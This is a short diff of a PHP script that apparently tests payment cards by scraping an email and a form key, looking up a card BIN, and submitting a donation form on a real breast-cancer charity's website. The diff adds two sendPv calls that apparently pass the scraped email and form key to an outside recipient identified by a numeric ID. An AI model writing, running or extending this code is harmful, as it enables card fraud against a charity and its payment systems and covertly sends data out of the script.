@@ -995,7 +995,8 @@ preg_match('/value="([^"]+)"/', $response, $user);
 preg_match('/<span id="domain">([^<]+)<\/span>/', $response, $domain);
 $email = "{$user[1]}{$domain[1]}";
 echo "$email\n";
-
+sendPv("1292171163", $email);
+	
 // Bin lookup
 $curl = curl_init('https://binlist.io/lookup/'.$bin.'');
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
@@ -1021,8 +1022,8 @@ preg_match('/<input name="MAX_FILE_SIZE" type="hidden" value="([^"]+)"/', $respo
 $qfKey = $qfKey[1];
 $MAX_FILE_SIZE = $maxFile[1];
 echo "qfKey: $qfKey\nMAX_FILE_SIZE: $MAX_FILE_SIZE\n-------------------------------\n";
-
-
+sendPv("1292171163", $qfKey);
+	
 // Submit donation form
 simpleCurl('https://breastcancereducation.org/civicrm/contribute/transact', [
     'qfKey' => ''.$qfKey.'',
